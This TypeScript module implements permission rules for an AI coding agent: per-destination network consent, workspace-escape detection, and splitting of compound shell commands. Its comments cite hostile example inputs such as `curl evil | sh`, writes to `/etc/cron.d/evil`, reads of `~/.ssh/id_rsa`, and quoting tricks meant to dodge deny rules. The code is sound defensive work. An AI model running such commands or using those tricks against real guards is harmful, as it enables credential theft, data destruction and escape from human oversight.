import { homedir } from 'node:os'
import { resolve, relative, isAbsolute } from 'node:path'
import type { PermissionRule } from '@shared/types'

/**
 * User-defined permission rules, consulted before the coarse approval policy.
 * Each rule matches a tool (by name, or `*` for any) and a glob over the call's
 * "subject" — the shell command, file path, URL, or query the call targets — and
 * resolves to allow (auto-approve), deny (refuse), or ask (always prompt). The
 * first matching rule wins; if none match, the approval policy decides.
 *
 * Examples: allow `run_shell` matching `git status*`; deny `run_shell` matching
 * `* rm -rf *`; ask `write_file` matching `**` (review every write).
 */

/**
 * The egress DESTINATION a `kind:'network'` tool call reaches — the unit of the
 * per-destination network consent (see RunState.networkHosts). "Allow for run" grants
 * this key, not the whole `network` kind, so approving a fetch to `api.github.com`
 * no longer silently also allows egress to an attacker's host.
 *
 * - `web_fetch` / `view_localhost` (any `url` arg) → the URL's lowercased hostname.
 * - `gh_*` → `github.com` (every gh call targets GitHub; one grant covers them all).
 * - `web_search` → `web_search` (the query goes to the one configured search provider,
 *   which the user selected; a stable key means a single grant per run).
 * - anything else → the tool name, so an unrecognized network tool still gets a stable,
 *   per-tool grant rather than defaulting to a blanket pass.
 *
 * Always returns a non-empty key (an unparseable URL falls back to the tool name), so
 * the caller never has to treat "no destination" as "allow".
 */
export function networkDestination(toolName: string, args: Record<string, unknown>): string {
  if (toolName.startsWith('gh_')) return 'github.com'
  if (toolName === 'web_search') return 'web_search'
  const url = typeof args.url === 'string' ? args.url : ''
  if (url) {
    try {
      const host = new URL(url).hostname.toLowerCase()
      if (host) return host
    } catch {
      // Malformed URL — fall through to the tool-name key; the fetch tool's own
      // validation surfaces the parse error when it runs.
    }
  }
  return toolName
}

/** The string a permission rule's pattern is matched against, per tool. */
export function permissionSubject(toolName: string, args: Record<string, unknown>): string {
  const s = (k: string): string => (typeof args[k] === 'string' ? (args[k] as string) : '')
  switch (toolName) {
    case 'run_shell':
      return s('command')
    case 'web_fetch':
      return s('url')
    case 'web_search':
      return s('query')
    default:
      // Namespaced MCP tools (mcp__<id>__<tool>) take arbitrary args, so match on
      // the tool name itself — lets rules target a server/tool, e.g. `mcp__github__*`.
      if (toolName.startsWith('mcp__')) return toolName
      // File-ish tools target a path or pattern.
      return s('path') || s('pattern')
  }
}

/**
 * Split a shell command into whitespace-delimited tokens, honouring single- and
 * double-quoted spans (quotes stripped, contents kept). Good enough to scan
 * arguments for path-like tokens; not a full shell parser (no variable/command
 * substitution, no escape sequences).
 */
function tokenizeShellCommand(command: string): string[] {
  const tokens: string[] = []
  const re = /"([^"]*)"|'([^']*)'|(\S+)/g
  let m: RegExpExecArray | null
  while ((m = re.exec(command)) !== null) {
    tokens.push(m[1] ?? m[2] ?? m[3] ?? '')
  }
  return tokens
}

/**
 * The absolute filesystem location a path-like segment points at, or `null` when the
 * segment is not an absolute/home/Windows path (i.e. it is relative). `~`, `$HOME`,
 * and `${HOME}` expand to the home directory; the checks are boundary-anchored so
 * `$HOMEWORK` is not mistaken for `$HOME`.
 */
function absoluteTarget(seg: string): string | null {
  if (seg.startsWith('/')) return seg
  if (seg === '~' || seg.startsWith('~/')) return homedir() + seg.slice(1)
  if (seg === '$HOME' || seg.startsWith('$HOME/')) return homedir() + seg.slice('$HOME'.length)
  if (seg === '${HOME}' || seg.startsWith('${HOME}/')) return homedir() + seg.slice('${HOME}'.length)
  // Windows drive-absolute (`C:\` or `C:/`) and UNC (`\\host\share`) paths.
  if (/^[A-Za-z]:[\\/]/.test(seg) || seg.startsWith('\\\\')) return seg
  return null
}

/** Strip one matching pair of surrounding single/double quotes from a segment. */
function stripSurroundingQuotes(seg: string): string {
  if (seg.length >= 2) {
    const q = seg[0]
    if ((q === '"' || q === "'") && seg[seg.length - 1] === q) return seg.slice(1, -1)
  }
  return seg
}

/**
 * Peel a leading shell redirection operator off a token, returning the path glued to
 * it, or `null` when the token is not a glued redirection. Handles `>`, `>>`, `<`,
 * `<<`, `<<<`, `<>`, `>|`, `>&`, `&>` with an optional leading fd (`2>`, `1>>`), so a
 * target written without a space (`>/etc/x`, `<~/.ssh/id_rsa`, `2>/abs/log`) is still
 * analysed. The spaced form is already a separate token and handled directly.
 */
function stripRedirection(token: string): string | null {
  const m = /^\d*(?:>>|<<<|<<|<>|>\||>&|&>|>|<)(.+)$/.exec(token)
  return m ? m[1]! : null
}

/**
 * Whether `target` resolves inside one of the workspace `roots`. Lexical only — `.`
 * and `..` are normalized, but symlinks are not walked (that is the sandbox's job).
 */
function isWithinRoots(target: string, roots: string[]): boolean {
  const t = resolve(target)
  for (const root of roots) {
    const rel = relative(resolve(root), t)
    if (rel === '' || (!rel.startsWith('..') && !isAbsolute(rel))) return true
  }
  return false
}

/**
 * Whether a single path-like segment escapes the workspace `roots`.
 *
 * - An absolute / home / Windows path escapes only when it resolves OUTSIDE every
 *   root. An absolute path INTO the workspace (e.g. `cd /abs/workspace && …`, which
 *   agents emit constantly) is NOT an escape — a purely syntactic "any absolute path
 *   escapes" check flagged all of them and forced needless approvals in full-auto.
 * - A relative path escapes iff it climbs above the run's cwd (the workspace root)
 *   via `..` (`../x`, `a/../../b`, `..\x`). This is a lexical property, independent of
 *   the roots. A relative path that climbs then returns (`a/../b`) stays inside.
 */
function segmentEscapesWorkspace(seg: string, roots: string[]): boolean {
  if (!seg) return false
  // A quoted path (`"/etc/shadow"`, `'~/f'`) keeps its quotes when it is glued to a
  // flag/redirection or sits after `=`, since the tokenizer only strips quotes that
  // wrap the whole token. Peel a surrounding pair so the value is analysed.
  seg = stripSurroundingQuotes(seg)
  if (!seg) return false
  const abs = absoluteTarget(seg)
  if (abs !== null) return !isWithinRoots(abs, roots)
  // Relative. Treat backslashes as separators too, so Windows-style relative climbs
  // (`..\x`) are analysed the same as POSIX ones. A token with no separator and no
  // ".." can't climb out.
  const norm = seg.replace(/\\/g, '/')
  if (!norm.includes('/') && norm !== '..') return false
  let depth = 0
  for (const part of norm.split('/')) {
    if (part === '' || part === '.') continue
    if (part === '..') {
      depth -= 1
      if (depth < 0) return true
    } else {
      depth += 1
    }
  }
  return false
}

/**
 * Whether a `run_shell` command references a filesystem path outside the workspace
 * `roots` — an absolute/home path that resolves outside every root, or a relative
 * path that climbs above the workspace root. Also inspects the value side of an `=`
 * (so env prefixes like `FOO=/etc/x` and flags like `--file=/etc/x` are caught).
 *
 * Best-effort and deliberately conservative: a command that escapes is escalated
 * for approval, never silently auto-run. It can't catch paths hidden behind
 * variable or command substitution — those defeat any static scan — so it's a
 * tripwire, not a sandbox. The sandbox remains the real confinement boundary.
 */
export function shellReferencesExternalPath(command: string, roots: string[]): boolean {
  for (const token of tokenizeShellCommand(command)) {
    if (segmentEscapesWorkspace(token, roots)) return true
    // A redirection glued to its target (`>/etc/cron.d/evil`, `<~/.ssh/id_rsa`,
    // `2>/abs/log`) keeps the operator inside the token; peel it so the path is seen.
    const redir = stripRedirection(token)
    if (redir !== null && segmentEscapesWorkspace(redir, roots)) return true
    // `KEY=value` / `--flag=value`: the path may sit after the first `=`.
    const eq = token.indexOf('=')
    if (eq >= 0 && segmentEscapesWorkspace(token.slice(eq + 1), roots)) return true
  }
  return false
}

/**
 * Validate untrusted JSON from a *tighten-only* settings source — the per-project
 * `.houston/settings.json` and the admin managed policy — into safe permission rules:
 * well-formed entries whose action is `deny` or `ask` only. `allow` rules (and any
 * other keys such as hooks/mcpServers) are dropped, so such a source can only ever
 * make the agent MORE cautious — it can never auto-approve an action or spawn a
 * process. Capped at `maxRules` as a DoS guard against a pathologically large file.
 * Pure + exported for testing.
 */
export function parseTightenOnlyRules(raw: unknown, maxRules: number): PermissionRule[] {
  const rules = (raw as { permissionRules?: unknown })?.permissionRules
  if (!Array.isArray(rules)) return []
  const out: PermissionRule[] = []
  for (const r of rules) {
    if (out.length >= maxRules) break
    if (typeof r !== 'object' || r === null) continue
    const { action, tool, match } = r as Record<string, unknown>
    if (action !== 'deny' && action !== 'ask') continue // never honor `allow` (would loosen)
    if (typeof tool !== 'string' || typeof match !== 'string') continue
    out.push({ action, tool, match })
  }
  return out
}

function escapeRegExp(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
}

/**
 * Which flavour of subject a tool's permission pattern is matched against, so the
 * matcher can canonicalize both sides consistently before comparing:
 * - `shell`  — a command line (handled by {@link matchShellRule}, dequoted).
 * - `url`    — an http(s) URL; scheme + host are case-folded (see {@link lowerUrlAuthority}).
 * - `path`   — a filesystem path/glob; canonicalized + anchored to the roots.
 * - `opaque` — a free-form string (a search query, an MCP tool name); matched verbatim.
 */
function subjectKind(toolName: string): 'shell' | 'url' | 'path' | 'opaque' {
  if (toolName === 'run_shell') return 'shell'
  if (toolName === 'web_fetch') return 'url'
  if (toolName === 'web_search' || toolName.startsWith('mcp__')) return 'opaque'
  return 'path'
}

// The leading `scheme://authority` of a URL (authority = optional userinfo, host,
// optional :port — everything up to the first `/`, `?`, or `#`). Scheme and host
// are case-insensitive per RFC 3986, so both are lowercased before matching; the
// path/query/fragment that follow stay case-sensitive. Anchored, so only the
// leading authority is touched — a `*`-only pattern (no scheme) is left alone.
const URL_AUTHORITY_RE = /^[a-zA-Z][a-zA-Z0-9+.-]*:\/\/[^/?#]*/

/** Lowercase a URL's scheme + host so `HTTPS://Evil.COM/x` and `https://evil.com/x` match. */
function lowerUrlAuthority(s: string): string {
  return s.replace(URL_AUTHORITY_RE, (m) => m.toLowerCase())
}

/**
 * Canonicalize a filesystem-path SUBJECT to the absolute, lexically-normalized
 * location the file tools themselves would act on (same resolution as
 * `resolveInRoots`): `.`/`..` collapsed, `~`/`$HOME` expanded, relative paths
 * anchored at the first root. So equivalent spellings of one location compare
 * equal — a deny can't be dodged by `/tmp/../etc/passwd`, and a relative `allow`
 * rule can't be widened by `src/../../../etc/passwd` climbing out of the tree.
 */
function canonicalizePath(p: string, roots: string[]): string {
  const abs = absoluteTarget(p)
  if (abs !== null) return resolve(abs)
  const base = roots[0] ?? process.cwd()
  return resolve(base, p)
}

/**
 * The canonical absolute form(s) of a path RULE PATTERN (the `*` wildcard survives
 * — it is an ordinary character to the path normalizer). An absolute/home pattern
 * anchors once; a RELATIVE pattern (e.g. `src/*`) is anchored to EACH root, so it
 * matches a file under any workspace root, not just the first.
 */
function candidatePatternPaths(pattern: string, roots: string[]): string[] {
  const abs = absoluteTarget(pattern)
  if (abs !== null) return [resolve(abs)]
  const bases = roots.length ? roots : [process.cwd()]
  return bases.map((b) => resolve(b, pattern))
}

/**
 * Whether a canonicalized path `subject` matches a path rule `rawPattern` (anchored
 * to the roots). Preserves the two special cases {@link patternMatches} enforces
 * on the raw pattern — an empty pattern is inert (matches nothing), and a pure
 * `*`/`**` (or `/`) pattern matches everything — BEFORE anchoring, so an empty
 * match can't be resolved into "the root directory, and everything under it".
 */
function pathPatternMatches(rawPattern: string, roots: string[], subject: string): boolean {
  const raw = rawPattern.trim()
  if (!raw) return false
  if (/^[*/]+$/.test(raw)) return true
  for (const cand of candidatePatternPaths(raw, roots)) {
    if (globMatches(cand, subject)) return true
    // Bare directory prefix: `src` (→ `<root>/src`) covers `<root>/src/a.ts`.
    if (subject === cand || subject.startsWith(`${cand}/`)) return true
  }
  return false
}

/**
 * Whether `subject` matches a permission `pattern`, where `*` is the only wildcard
 * and — unlike a path glob — it spans ANY characters, including `/`. This is the
 * crux for URLs and nested paths: a rule like `https://host/*` or `src/*` must match
 * `https://host/a/b` and `src/a/b.ts`, not just one path segment. A segment-scoped
 * `*` silently under-matches, which for an `allow` rule means needless re-prompts
 * and for a `deny` rule means it fails to fire at all.
 */
function globMatches(pattern: string, subject: string): boolean {
  const re = new RegExp(`^${pattern.split('*').map(escapeRegExp).join('.*')}$`)
  return re.test(subject)
}

/**
 * Whether two patterns in the `*`-only glob language (where `*` matches any run of
 * characters, including empty) share at least one common matching string. Symmetric.
 * Used by rule cleanup to detect when a generalized allow would overlap a deny's
 * command-set — a check a one-directional literal match can't make. O(|a|·|b|) via
 * memoized alignment: at each position, a `*` on either side either matches nothing
 * (advance past it) or absorbs the character the other side contributes (advance the
 * other); two literals must be equal and advance together.
 */
function globsIntersect(a: string, b: string): boolean {
  const memo = new Map<number, boolean>()
  const solve = (i: number, j: number): boolean => {
    if (i === a.length && j === b.length) return true
    if (i === a.length) return b[j] === '*' && solve(i, j + 1)
    if (j === b.length) return a[i] === '*' && solve(i + 1, j)
    const memoKey = i * (b.length + 1) + j
    const cached = memo.get(memoKey)
    if (cached !== undefined) return cached
    let result: boolean
    if (a[i] === '*' || b[j] === '*') result = solve(i + 1, j) || solve(i, j + 1)
    else result = a[i] === b[j] && solve(i + 1, j + 1)
    memo.set(memoKey, result)
    return result
  }
  return solve(0, 0)
}

function patternMatches(pattern: string, subject: string): boolean {
  const p = pattern.trim()
  // An empty pattern matches NOTHING (the rule is inert), not everything — a blank
  // match must never silently auto-approve/deny every call. Use `*` for match-all.
  if (!p) return false
  if (p === '*') return true
  if (globMatches(p, subject)) return true
  // Bare-prefix convenience: a wildcard-free rule also matches at a command (" ") or
  // path/URL ("/") boundary, so `https://host` covers `https://host/x` and `src`
  // covers `src/a.ts` — without forcing the user to append `/*`.
  return subject === p || subject.startsWith(`${p} `) || subject.startsWith(`${p}/`)
}

/**
 * First matching rule's action for a single (non-shell) subject, or null. Both the
 * subject and each rule pattern are canonicalized by kind before comparing — URLs
 * case-folded on scheme+host, filesystem paths resolved and anchored to the roots —
 * so a rule can't be dodged (deny) or widened (allow) by a spelling that resolves
 * to the same target.
 */
function matchOne(
  rules: PermissionRule[],
  toolName: string,
  subject: string,
  roots: string[] = []
): PermissionRule['action'] | null {
  const kind = subjectKind(toolName)
  const canonSubject =
    kind === 'url' ? lowerUrlAuthority(subject) : kind === 'path' ? canonicalizePath(subject, roots) : subject
  for (const r of rules) {
    if (r.tool && r.tool !== '*' && r.tool !== toolName) continue
    const match = r.match ?? ''
    const hit =
      kind === 'path'
        ? pathPatternMatches(match, roots, canonSubject)
        : kind === 'url'
          ? patternMatches(lowerUrlAuthority(match), canonSubject)
          : patternMatches(match, canonSubject)
    if (hit) return r.action
  }
  return null
}

/** Collapse whitespace runs so trivial spacing variants match the same rule. */
function normalizeShellCommand(s: string): string {
  return s.replace(/\s+/g, ' ').trim()
}

/**
 * Reduce a shell command to the logical text the shell would execute, by stripping
 * quotes and resolving backslash escapes: `"rm"`, `r''m`, `\rm`, and `rm -r"f"` all
 * collapse to `rm`. Without this, a deny rule like `*rm -rf*` is trivially dodged by
 * quoting the program name — the literal command string no longer contains the token
 * `rm -rf`, so the pattern never fires. Applied to BOTH the rule pattern and the
 * command before matching, so a rule the user deliberately wrote with quotes (e.g.
 * `git commit -m "*"`) still matches. The `*` wildcard survives (it's an ordinary
 * character here — a rule pattern's `*` stays a wildcard for {@link globMatches}).
 *
 * Not a full shell parser: it strips quoting/escaping so the matcher sees through
 * spelling tricks, and runs per leaf sub-command AFTER {@link splitShellCommand}
 * has already peeled off substitutions and control operators — so it can't merge
 * two commands into one or hide a smuggled command.
 */
function dequoteShell(s: string): string {
  let out = ''
  for (let i = 0; i < s.length; ) {
    const c = s[i]
    if (c === '\\') {
      // Backslash escapes the next char (outside quotes); drop the backslash, keep the char.
      if (i + 1 < s.length) {
        out += s[i + 1]
        i += 2
      } else {
        i += 1
      }
    } else if (c === '"') {
      i += 1
      while (i < s.length && s[i] !== '"') {
        // Inside double quotes a backslash only escapes " ` $ \ (and newline); otherwise literal.
        if (s[i] === '\\' && i + 1 < s.length && '"`$\\\n'.includes(s[i + 1])) {
          out += s[i + 1]
          i += 2
        } else {
          out += s[i]
          i += 1
        }
      }
      i += 1 // skip the closing quote (or run off the end on an unbalanced quote)
    } else if (c === "'") {
      i += 1 // single quotes are literal — no escapes inside
      while (i < s.length && s[i] !== "'") {
        out += s[i]
        i += 1
      }
      i += 1 // skip the closing quote
    } else {
      out += c
      i += 1
    }
  }
  return out
}

/**
 * Match a permission pattern against a shell command. `*` matches any run of
 * characters including `/` (a command is not a path — `/` is just a character),
 * so a deny rule like `*rm -rf*` fires on `rm -rf /tmp/x`. Both sides are first
 * reduced past quoting/escaping (see {@link dequoteShell}) so the rule matches on
 * what actually runs, not how it was spelled. Falls back to a prefix match for
 * convenience ("git" matches "git status").
 */
function shellCommandMatches(pattern: string, command: string): boolean {
  // An empty pattern matches nothing (inert rule), not every command — check the
  // raw pattern before dequoting so a stray-quotes pattern can't be treated as `*`.
  if (!pattern.trim()) return false
  const p = normalizeShellCommand(dequoteShell(pattern))
  const c = normalizeShellCommand(dequoteShell(command))
  if (!p) return false
  if (p === '*') return true
  if (globMatches(p, c)) return true
  return c === p || c.startsWith(`${p} `)
}

/** First matching rule's action for a single shell sub-command, or null. */
function matchOneShell(rules: PermissionRule[], command: string): PermissionRule['action'] | null {
  for (const r of rules) {
    if (r.tool && r.tool !== '*' && r.tool !== 'run_shell') continue
    if (shellCommandMatches(r.match ?? '', command)) return r.action
  }
  return null
}

/**
 * Best-effort split of a shell command into the simple commands it would actually
 * run, so a permission rule can be required to cover EVERY one. Splits on the
 * control operators (`&&`, `||`, `;`, `|`, `&`, newline) and additionally pulls
 * out the bodies of command substitutions (`$(...)`, backticks) AND process
 * substitutions (`<(...)`, `>(...)`) — all of which run their own commands,
 * including when nested. NOT a full shell parser — it deliberately over-segments
 * (more pieces ⇒ stricter), so an `allow` rule can't auto-approve a compound
 * command that smuggles in an unapproved sub-command.
 *
 * A hand-written scanner (not one regex) is used because the substitution bodies
 * nest: `$(rm -rf "(x)")` has a paren inside, and `<(diff <(a) <(b))` nests three
 * deep. The previous `\$\(([^()]*)\)` regex couldn't span an inner `(`, so a body
 * containing one leaked back into the outer command and matched a narrow `allow`
 * rule (e.g. `echo *`), auto-approving the smuggled command; `<(...)`/`>(...)`
 * were not recognized at all.
 */
export function splitShellCommand(command: string): string[] {
  const segments: string[] = []
  collectShellSegments(command, segments, 0)
  return segments.length ? segments : [command.trim()]
}

/** Cap on substitution nesting so a pathologically deep command can't recurse forever. */
const MAX_SUBST_DEPTH = 32

/**
 * Peel command/process-substitution bodies out of `command` — recursing so a body
 * that itself chains commands or nests further substitutions is fully expanded —
 * then split the residual on the shell control operators. Nested parens are
 * balanced so substitution boundaries are found correctly.
 */
function collectShellSegments(command: string, segments: string[], depth: number): void {
  const recurse = (inner: string): void => {
    if (depth < MAX_SUBST_DEPTH) {
      collectShellSegments(inner, segments, depth + 1)
    } else {
      // Too deep to keep expanding — surface the body opaquely so it still can't
      // match a narrow allow rule (over-segment ⇒ stricter, never looser).
      const t = inner.trim()
      if (t) segments.push(t)
    }
  }
  let outer = ''
  for (let i = 0; i < command.length; ) {
    const two = command.slice(i, i + 2)
    if (two === '$(' || two === '<(' || two === '>(') {
      const close = matchClosingParen(command, i + 1)
      if (close === -1) {
        // Unbalanced (a shell syntax error) — treat the rest as a command body too
        // so nothing hides behind the unterminated opener, then stop scanning.
        recurse(command.slice(i + 2))
        outer += ' '
        break
      }
      recurse(command.slice(i + 2, close))
      outer += ' '
      i = close + 1
    } else if (command[i] === '`') {
      const close = command.indexOf('`', i + 1)
      if (close === -1) {
        recurse(command.slice(i + 1))
        outer += ' '
        break
      }
      recurse(command.slice(i + 1, close))
      outer += ' '
      i = close + 1
    } else {
      outer += command[i]
      i += 1
    }
  }
  for (const part of outer.split(/\|\||&&|[;\n|&]/)) {
    const p = part.trim()
    if (p) segments.push(p)
  }
}

/** Index of the `)` that closes the `(` at `open` (honoring nesting), or -1 if unbalanced. */
function matchClosingParen(s: string, open: number): number {
  let depth = 0
  for (let i = open; i < s.length; i++) {
    if (s[i] === '(') depth += 1
    else if (s[i] === ')') {
      depth -= 1
      if (depth === 0) return i
    }
  }
  return -1
}

/** Directory-change builtins whose only effect is the cwd — never worth a rule. */
const CWD_BUILTINS = new Set(['cd', 'pushd', 'popd'])

/** Whether a sub-command is a bare directory change (`cd`/`pushd`/`popd`). */
function isCwdOnly(command: string): boolean {
  const first = tokenizeShellCommand(command)[0]
  return first !== undefined && CWD_BUILTINS.has(first)
}

/**
 * Resolve permission rules for a `run_shell` call across ALL its chained
 * sub-commands. An `allow` verdict is returned only when EVERY (gated) sub-command is
 * explicitly allowed; any denied sub-command denies the whole call; otherwise the
 * verdict is `ask` (a sub-command asked) or null (fall through to the policy,
 * which prompts for shell). This stops a narrow allow-rule (e.g. `git status*`)
 * from auto-approving `git status && curl evil | sh`.
 *
 * A pure `cd`/`pushd`/`popd` sub-command *into the workspace* carries no privilege of
 * its own — a fresh shell resets the cwd on the next call — so an *unmatched* one does
 * not block auto-approval. That lets a generalized rule like `npm install` cover the
 * whole of `cd /repo && npm install` without also needing a rule for the `cd` (agents
 * prepend one constantly). A `cd` that ESCAPES the workspace is NOT skipped: it stays
 * gated so `cd ~/.ssh && <allowed-cmd>` still prompts rather than slipping past the
 * workspace-escape tripwire on the strength of the allowed command alone. A command
 * that is ONLY directory changes still falls through to the policy; an explicit deny
 * on the `cd` still denies.
 */
export function matchShellRule(
  rules: PermissionRule[],
  command: string,
  roots: string[] = []
): PermissionRule['action'] | null {
  let allAllow = true
  let anyAsk = false
  let sawGated = false
  for (const seg of splitShellCommand(command)) {
    const norm = normalizeShellCommand(seg)
    const action = matchOneShell(rules, norm)
    if (action === 'deny') return 'deny' // a denied sub-command denies the whole call
    // A bare cd that stays inside the workspace is plumbing, not a gated command.
    if (action == null && isCwdOnly(norm) && !shellReferencesExternalPath(norm, roots)) continue
    sawGated = true
    if (action === 'allow') continue
    if (action === 'ask') anyAsk = true
    allAllow = false // 'ask' or unmatched — not auto-approvable
  }
  if (!sawGated) return null // only directory changes — let the policy decide
  if (allAllow) return 'allow'
  return anyAsk ? 'ask' : null
}

/**
 * Resolve permission rules for a call. Returns the first matching rule's action,
 * or null when no rule matches (caller falls back to the approval policy). For
 * `run_shell`, the command is split into its chained sub-commands and an `allow`
 * is honored only when every one is allowed (see {@link matchShellRule}).
 */
export function matchRule(
  rules: PermissionRule[] | undefined,
  toolName: string,
  subject: string,
  roots: string[] = []
): PermissionRule['action'] | null {
  if (!rules?.length) return null
  if (toolName === 'run_shell') return matchShellRule(rules, subject, roots)
  return matchOne(rules, toolName, subject, roots)
}

/** A leading `VAR=value` env-assignment token, which precedes the real program. */
const ENV_ASSIGN = /^[A-Za-z_][A-Za-z0-9_]*=/

/** A bare sub-command verb like `status` or `install` — not a flag, path, or value. */
const SUBCOMMAND_VERB = /^[a-z][a-z0-9:._-]*$/i

/**
 * Command wrappers whose second token is itself a program, not a sub-command verb.
 * Generalizing `<wrapper> <program>` to a two-token prefix would broaden a specific
 * "Always allow" into a blanket pass — e.g. `sudo rm -rf /tmp/build` collapsing to a
 * `sudo rm` rule that then auto-approves `sudo rm -rf /`. These stay verbatim.
 */
const COMMAND_WRAPPERS = new Set([
  'sudo',
  'doas',
  'env',
  'xargs',
  'nohup',
  'timeout',
  'time',
  'nice',
  'ionice',
  'stdbuf',
  'setsid',
  'command',
  'exec',
  'watch'
])

/**
 * The permission-rule pattern(s) to persist when the user picks "Always allow" on a
 * `run_shell` call. Storing the exact command bakes in one-off arguments (and the
 * `cd <dir> &&` prelude agents habitually prepend), so every near-identical command
 * spawns its own rule and the Permissions panel fills with noise. Instead this returns
 * a small set of generalized, per-sub-command prefixes:
 *
 * - The command is split into its chained sub-commands (the same split the matcher
 *   uses), so `cd /repo && npm install foo` yields a rule for `npm install`, not the
 *   whole line.
 * - Pure directory-change sub-commands (`cd`/`pushd`/`popd`) are dropped — they carry
 *   no privilege and only add noise.
 * - A sub-command shaped `<program> <verb> …` where `<verb>` is a bare word (e.g.
 *   `git status`, `npm install`) generalizes to that two-token prefix, so repeated
 *   invocations with different trailing arguments collapse onto one rule.
 * - Anything else — a lone program, a program whose next token is a flag/path, an
 *   env-prefixed command, or a command wrapper (`sudo`/`env`/`xargs`/… — see
 *   {@link COMMAND_WRAPPERS}) whose second token is another program — is kept verbatim,
 *   so raw operations like `cat x`, `rm -rf y`, or `sudo rm -rf z` are NOT silently
 *   broadened to `cat`/`rm`/`sudo rm`.
 *
 * Used only for the ALLOW case; a deny is always stored exactly (a broadened deny is
 * dangerous). Never returns an empty list.
 */
export function shellRulePatterns(command: string): string[] {
  const patterns = new Set<string>()
  for (const seg of splitShellCommand(command)) {
    const norm = normalizeShellCommand(seg)
    const tokens = tokenizeShellCommand(norm)
    const prog = tokens[0]
    if (!prog || CWD_BUILTINS.has(prog)) continue
    const verb = tokens[1]
    if (!ENV_ASSIGN.test(prog) && !COMMAND_WRAPPERS.has(prog) && verb && SUBCOMMAND_VERB.test(verb)) {
      patterns.add(`${prog} ${verb}`)
    } else {
      patterns.add(norm)
    }
  }
  if (patterns.size === 0) patterns.add(normalizeShellCommand(command))
  return [...patterns]
}

/**
 * Whether the current `rules` already resolve `sample` (a command, path, URL, or query
 * that a new rule would target) to ALLOW. Used to skip persisting a rule an existing,
 * broader rule already covers, so "Always allow" never piles up redundant entries.
 */
export function alreadyAllowedAsRule(
  rules: PermissionRule[],
  toolName: string,
  sample: string
): boolean {
  if (toolName === 'run_shell') return matchOneShell(rules, normalizeShellCommand(sample)) === 'allow'
  return matchOne(rules, toolName, sample) === 'allow'
}

/**
 * Rewrite a permission-rule list into an equivalent-but-tidier one, backing the
 * Settings panel's "Clean up rules" action. It:
 *
 * - Re-runs each `run_shell` ALLOW rule through {@link shellRulePatterns}, collapsing a
 *   pile of exact, `cd`-prefixed commands onto a handful of generalized prefixes —
 *   EXCEPT a rule is left exactly as-is when any generalization of it would newly cover
 *   an existing deny rule, so a narrower deny is never silently shadowed.
 * - Drops any allow rule already covered by an earlier kept allow rule, and any exact
 *   duplicate — preserving order, so first-match-wins semantics are unchanged.
 *
 * Deny/ask rules and non-shell rules are preserved verbatim (only exact dedupe
 * applies). Pure and order-stable, so the caller can diff old vs new before saving.
 */
export function cleanupPermissionRules(rules: PermissionRule[]): PermissionRule[] {
  const denies = rules.filter((r) => r.action === 'deny')
  const wouldShadowDeny = (pattern: string): boolean =>
    denies.some((d) => {
      if (d.tool && d.tool !== '*' && d.tool !== 'run_shell') return false
      const deny = (d.match ?? '').trim()
      if (!deny) return false
      // A generalized allow covers `pattern` AND `pattern <args…>`. Keep the rule exact
      // if a deny's command-set overlaps EITHER, so broadening an allow can never open a
      // hole a narrower deny was guarding. A one-directional literal test (does the
      // allow-prefix match the deny's text) misses wildcard denies like `* --force*`,
      // which overlap the prefix `git push` only on the extended `git push --force …`.
      return globsIntersect(deny, pattern) || globsIntersect(deny, `${pattern} *`)
    })
  const out: PermissionRule[] = []
  const seen = new Set<string>()
  const key = (r: PermissionRule): string => `${r.action} ${r.tool} ${r.match}`
  for (const r of rules) {
    let expanded: PermissionRule[] = [r]
    if (r.action === 'allow' && r.tool === 'run_shell') {
      const pats = shellRulePatterns(r.match ?? '')
      // Keep the rule exact if generalizing it could shadow a narrower deny.
      expanded = pats.some(wouldShadowDeny) ? [r] : pats.map((match) => ({ ...r, match }))
    }
    for (const e of expanded) {
      if (seen.has(key(e))) continue
      const priorAllows = out.filter((x) => x.action === 'allow')
      if (e.action === 'allow' && alreadyAllowedAsRule(priorAllows, e.tool, e.match ?? '')) continue
      seen.add(key(e))
      out.push(e)
    }
  }
  return out
}
